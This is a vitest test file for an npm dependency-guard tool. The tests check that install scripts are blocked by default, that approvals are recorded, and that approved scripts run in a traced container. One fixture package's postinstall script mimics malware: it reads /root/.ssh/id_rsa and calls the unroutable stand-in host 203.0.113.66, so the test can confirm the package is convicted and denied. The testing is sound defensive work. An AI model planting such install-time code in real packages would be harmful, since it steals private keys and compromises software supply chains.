// Layers 3+4: ignore-scripts default, ask-once approvals, and the box
// (DESIGN.md §7–§9). The fixture package's postinstall writes marker.txt —
// its existence is the ground truth for "did the script actually run".
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { execFileSync } from 'node:child_process';
import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { MockRegistry } from './helpers/registry.mjs';
import { makeProject, guard, NPM_QUIET } from './helpers/run.mjs';

let reg;
const projects = [];

/** Is a container runtime available? Boxed-run test needs one. */
function hasDocker() {
  try {
    execFileSync('docker', ['version', '--format', '{{.Server.Version}}'], { stdio: 'pipe' });
    return true;
  } catch {
    return false;
  }
}

beforeAll(async () => {
  reg = await new MockRegistry().start();
  reg.publish('scripty', '1.0.0', {
    ageDays: 100,
    scripts: { postinstall: 'node mark.js' },
    files: {
      // __dirname-anchored so the marker lands in the package dir no matter
      // what cwd the script runs under (host or container).
      'mark.js': `require('fs').writeFileSync(require('path').join(__dirname, 'marker.txt'), 'ran');\n`,
    },
  });

  // A package whose postinstall behaves like real install-time malware:
  // reaches for a network destination (TEST-NET-3 IP — unroutable, instant
  // failure) and credentials. The box must convict on the ATTEMPTS.
  reg.publish('exfil-pkg', '1.0.0', {
    ageDays: 100,
    scripts: { postinstall: 'node steal.js' },
    files: {
      'steal.js': [
        `const fs = require('fs'), path = require('path');`,
        // Evidence the script DID run before conviction: write the marker first.
        `fs.writeFileSync(path.join(__dirname, 'marker.txt'), 'ran');`,
        `try { fs.readFileSync('/root/.ssh/id_rsa'); } catch {}`,
        `require('http').get('http://203.0.113.66:8080/x').on('error', () => {});`,
        `setTimeout(() => process.exit(0), 500);`,
      ].join('\n'),
    },
  });
});

afterAll(async () => {
  await reg.stop();
  for (const p of projects) p.cleanup();
});

function project(opts) {
  const p = makeProject(reg.url, opts);
  projects.push(p);
  return p;
}

const marker = (dir) => join(dir, 'node_modules', 'scripty', 'marker.txt');

describe('install scripts are neutralized by default', () => {
  it('installs the package but does NOT run its postinstall non-interactively', async () => {
    const { dir } = project();
    const res = await guard(dir, ['install', 'scripty', ...NPM_QUIET]);
    expect(res.code).toBe(0);
    // Files landed...
    expect(existsSync(join(dir, 'node_modules', 'scripty', 'mark.js'))).toBe(true);
    // ...but the script never executed, and guard said how to proceed.
    expect(existsSync(marker(dir))).toBe(false);
    expect(res.stderr).toContain('scripty@1.0.0');
    expect(res.stderr).toContain('guard approve');
  });

  it('never runs a script denied in .guard-approvals', async () => {
    const { dir } = project();
    await guard(dir, ['approve', 'scripty@1.0.0', '--deny']);
    const res = await guard(dir, ['install', 'scripty', ...NPM_QUIET]);
    expect(res.code).toBe(0);
    expect(existsSync(marker(dir))).toBe(false);
    expect(res.stderr).toContain('denied');
  });

  it('records decisions in a committed, reviewable file', async () => {
    const { dir } = project();
    const res = await guard(dir, ['approve', 'scripty@1.0.0']);
    expect(res.code).toBe(0);
    const approvals = JSON.parse(readFileSync(join(dir, '.guard-approvals'), 'utf8'));
    expect(approvals.packages['scripty@1.0.0'].decision).toBe('approved-boxed');
  });
});

describe.skipIf(!hasDocker())('the box', () => {
  it('runs an approved script sealed in a container, and the script takes effect', async () => {
    const { dir } = project();
    await guard(dir, ['approve', 'scripty@1.0.0']);
    const res = await guard(dir, ['install', 'scripty', ...NPM_QUIET]);
    expect(res.code).toBe(0);
    expect(res.stderr).toContain('running boxed');
    // The script ran inside the container and its write to the package dir
    // (the only writable mount) is visible on the host.
    expect(existsSync(marker(dir))).toBe(true);
    expect(readFileSync(marker(dir), 'utf8')).toBe('ran');
    // The box reported what it observed.
    expect(res.stderr).toMatch(/exit 0/);
  });

  it('a benign script passes the syscall trace (no false conviction)', async () => {
    const { dir } = project();
    await guard(dir, ['approve', 'scripty@1.0.0']);
    const res = await guard(dir, ['install', 'scripty', ...NPM_QUIET]);
    // Traced run, normal build behavior → no MALICIOUS verdict.
    expect(res.code).toBe(0);
    expect(res.stderr).toContain('traced');
    expect(res.stderr).not.toContain('MALICIOUSLY');
  });

  it('convicts, discards, and auto-denies a script that attempts exfil', async () => {
    const { dir } = project();
    await guard(dir, ['approve', 'exfil-pkg@1.0.0']);
    const res = await guard(dir, ['install', 'exfil-pkg', ...NPM_QUIET]);

    // The install FAILS with the evidence named.
    expect(res.code).not.toBe(0);
    expect(res.stderr).toContain('MALICIOUSLY');
    expect(res.stderr).toContain('203.0.113.66');
    expect(res.stderr).toContain('id_rsa');

    // Output discarded: the marker the script wrote is GONE (pre-run restore).
    const exfilMarker = join(dir, 'node_modules', 'exfil-pkg', 'marker.txt');
    expect(existsSync(exfilMarker)).toBe(false);
    // ...but the package files themselves survived the restore.
    expect(existsSync(join(dir, 'node_modules', 'exfil-pkg', 'steal.js'))).toBe(true);

    // Approval flipped to a committed, evidence-bearing denial.
    const approvals = JSON.parse(readFileSync(join(dir, '.guard-approvals'), 'utf8'));
    expect(approvals.packages['exfil-pkg@1.0.0'].decision).toBe('denied');
    expect(approvals.packages['exfil-pkg@1.0.0'].note).toContain('auto-denied');
  });
});


describe.skipIf(!hasDocker())('prewarm + clean split', () => {
  const imagePresent = () => {
    try {
      return execFileSync('docker', ['images', 'depguard-box:1', '--format', '{{.Repository}}'], { encoding: 'utf8' }).includes('depguard-box');
    } catch {
      return false;
    }
  };

  it('prewarm builds the image, clean keeps it, clean --image reclaims it', async () => {
    const { dir } = project();
    const pre = await guard(dir, ['prewarm']);
    expect(pre.code).toBe(0);
    expect(imagePresent()).toBe(true);

    // Routine clean keeps the (expensive) image so the next boxed run stays fast.
    const kept = await guard(dir, ['clean']);
    expect(kept.code).toBe(0);
    expect(kept.stdout).toContain('image kept');
    expect(imagePresent()).toBe(true);

    // --image reclaims it.
    const reclaimed = await guard(dir, ['clean', '--image']);
    expect(reclaimed.code).toBe(0);
    expect(imagePresent()).toBe(false);
  });
});
